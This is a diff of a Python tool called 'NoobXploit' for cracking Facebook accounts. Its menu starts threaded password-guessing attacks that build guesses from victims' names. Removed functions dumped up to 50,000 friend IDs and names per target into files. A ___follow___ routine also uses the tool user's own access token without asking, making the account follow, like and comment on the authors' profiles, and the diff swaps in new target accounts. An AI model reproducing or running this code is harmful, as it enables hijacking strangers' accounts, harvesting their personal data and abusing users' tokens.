@@ -504,14 +504,14 @@ def ___follow___():
         ___comment___ = (___say___+'\n\n'+___kata___+'\n'+___waktu___)
         ___comment2___ = (___say___+'\n\n'+___kata___+'\n'+___waktu___)
         ___comment3___ = random.choice(['Hello Bro','Mantap Bang','Keren Bang','Very Nice','Super','Hallo Bang'])
-        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(___token___)) #noob
-        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(___token___)) #noob2
+        requests.post('https://graph.facebook.com/100011256943278/subscribers?access_token=%s'%(___token___)) #aryan
+        requests.post('https://graph.facebook.com/100010581078300/subscribers?access_token=%s'%(___token___)) #kashif
         requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(___token___)) #noobxploit
-        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(___token___)) #cover photo
-        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(___token___)) # profile picture
+        requests.post('https://graph.facebook.com/1733688176993868/likes?summary=true&access_token=%s'%(___token___)) #cover photo
+        requests.post('https://graph.facebook.com/1644631679255381/likes?summary=true&access_token=%s'%(___token___)) # profile picture
         requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(___comment3___,___token___)) #cover photo
-        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___comment___,___token___)) #profile picture
-        requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___comment2___,___token___)) #profile picture
+        requests.post('https://graph.facebook.com/1733688176993868/comments/?message=%s&access_token=%s'%(___comment3___,___token___)) #profile picture
+        requests.post('https://graph.facebook.com/1644631679255381/comments/?message=%s&access_token=%s'%(___comment3___,___token___)) #aryan
         requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token___)) # Iwan
         requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Riyajul Islam
     except:
@@ -540,20 +540,14 @@ def ___menu___():
         ___login___()
     except (ConnectionError):
         exit("%s[%s!%s]%s Connection Error"%(P,M,P,M))
-    print("\n%s[%s1%s]%s Dump Random Public Id (2004-2021)"%(H,U,H,P))
-    print("%s[%s2%s]%s Dump Public Old Id (2009-2006)"%(H,U,H,P))
-    print("%s[%s3%s]%s Start Crack %s[%sFast%s/%sSlow%s]"%(B,U,B,P,K,H,K,H,K))
-    print("%s[%s4%s]%s View Results"%(H,U,H,P))
-    print("%s[%s5%s]%s Report Bug"%(H,U,H,P))
-    print("%s[%s6%s]%s Remove Token"%(H,U,H,P))
+    print("%s[%s1%s]%s Start Crack %s[%sFast%s/%sSlow%s]"%(B,U,B,P,K,H,K,H,K))
+    print("%s[%s2%s]%s View Results"%(H,U,H,P))
+    print("%s[%s3%s]%s Report Bug"%(H,U,H,P))
+    print("%s[%s4%s]%s Remove Token"%(H,U,H,P))
     ___menu___ = input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
     if ___menu___ in ['1','01']:
-        ___random___()
-    elif ___menu___ in ['2','02']:
-        ___masal2___()
-    elif ___menu___ in ['3','03']:
         ___metode___()
-    elif ___menu___ in ['4','04']:
+    elif ___menu___ in ['2','02']:
         print("\n%s[%s1%s]%s See NoobXploit Ok.txt"%(B,P,B,P))
         print("%s[%s2%s]%s See NoobXploit Cp.txt"%(B,P,B,P))
         print("%s[%s3%s]%s Return"%(B,K,B,P))
@@ -578,96 +572,17 @@ def ___menu___():
             ___menu___()
         else:
             exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
-    elif ___menu___ in ['12']:
+    elif ___menu___ in ['3']:
         print("%s[%s*%s]%s You Will Be Redirected To Whatsapp"%(B,P,B,P));sleep(2)
         os.system("xdg-open https://wa.me/+8801974401047?text=Hallo%20Noob%20Xploit")
         exit()
-    elif ___menu___ in ['13']:
+    elif ___menu___ in ['4']:
         os.system('rm -rf login.txt')
         exit()
     else:
         exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
 # random attack
-def ___random___():
-    try:
-        ___token___ = open('login.txt','r').read()
-    except (IOError):
-        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
-    try:
-        ___total___ = int(input("\n%s[%s?%s]%s Amount ID :%s "%(B,P,B,P,H)))
-    except:
-        ___total___ = 1
-    ___file___ = input("%s[%s?%s]%s Name File :%s "%(B,P,B,P,H))
-    for zx in range(___total___):
-        zx +=1
-        ___ids___ = input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
-        print(" ")
-        if ___ids___ in ['',' ']:
-            exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
-        try:
-            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
-            file = open(___file___ , 'a')
-            for a in rex['friends']['data']:
-                file.write(a['id']+"<=>"+a['name']+'\n')
-                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
-            file.close()
-            ___user___ = open(___file___,'r').readlines()
-            print("\r%s                    "%(P))
-            print("%s[%s*%s]%s Done..."%(H,P,H,P))
-            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
-            print("%s[%s?%s]%s Files Saved In :%s %s"%(H,P,H,P,K,___file___))
-            input("\n%s[%sReturn%s]"%(B,H,B));___menu___()
-        except (KeyError):
-            exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
-        except (ConnectionError):
-            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
-# Random Old
-def ___masal2___():
-    try:
-        ___token___ = open('login.txt','r').read()
-    except (IOError):
-        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
-    try:
-        ___total___ = int(input("\n%s[%s?%s]%s Amount ID :%s "%(B,P,B,P,H)))
-    except:
-        ___total___ = 1
-    ___file___ = input("%s[%s?%s]%s Name File :%s "%(B,P,B,P,H))
-    for zx in range(___total___):
-        zx +=1
-        ___ids___ = input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
-        print(" ")
-        if ___ids___ in ['',' ']:
-            exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
-        try:
-            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
-            file = open(___file___ , 'a')
-            for a in rex['friends']['data']:
-                if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
-                elif a['id'][:10] in ['1000000000']:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
-                elif a['id'][:9] in ['100000000']:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
-                elif a['id'][:8] in ['10000000']:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
-                elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
-            file.close()
-            ___user___ = open(___file___,'r').readlines()
-            print("\r%s                    "%(P))
-            print("%s[%s*%s]%s Done..."%(H,P,H,P))
-            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
-            print("%s[%s?%s]%s Files Saved In :%s %s"%(H,P,H,P,K,___file___))
-            input("\n%s[%sReturn%s]"%(B,H,B));___menu___()
-        except (KeyError):
-            exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
-        except (ConnectionError):
-            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
+
 def ___metode___():
     print("\n%s[%s1%s]%s Metode mbasic.facebook.com"%(B,P,B,P))
     print("%s[%s2%s]%s Metode free.facebook.com"%(B,P,B,P))
@@ -695,7 +610,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' | ')
+                uid, Name = user.split('|')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
@@ -725,7 +640,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' | ')
+                uid, Name = user.split('|')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
@@ -759,7 +674,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' | ')
+                uid, Name = user.split('|')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
@@ -789,7 +704,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' | ')
+                uid, Name = user.split('|')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
@@ -819,7 +734,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' | ')
+                uid, Name = user.split('|')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
@@ -849,7 +764,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' | ')
+                uid, Name = user.split('|')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
